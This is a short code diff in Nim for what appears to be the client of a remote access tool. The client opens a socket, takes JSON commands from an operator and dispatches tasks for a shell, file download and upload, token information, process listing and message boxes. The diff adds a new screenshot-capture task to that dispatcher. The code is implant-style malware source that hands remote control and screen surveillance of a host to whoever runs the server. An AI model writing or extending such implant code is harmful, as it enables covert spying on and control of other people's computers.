@@ -2,7 +2,7 @@ import net, base64, json, os
 
 import modules, communication
 
-import ../clientTasks/[shell, msgbox, download, tokinfo, processes, upload]
+import ../clientTasks/[shell, msgbox, download, tokinfo, processes, upload, screenshot]
 
 var client: Socket = newSocket()
 
@@ -59,6 +59,8 @@ proc receiveCommands(client: Socket) =
       msgbox.executeTask(client, taskId, jsonNode["data"]["title"].getStr(), jsonNode["data"]["caption"].getStr())
     of "download":
       download.executeTask(client, taskId, jsonNode["data"]["path"].getStr())
+    of "screenshot":
+      screenshot.executeTask(client, taskId)
     of "upload":
       upload.executeTask(client, taskId, jsonNode["data"]["contents"].getStr(), jsonNode["data"]["path"].getStr())
 
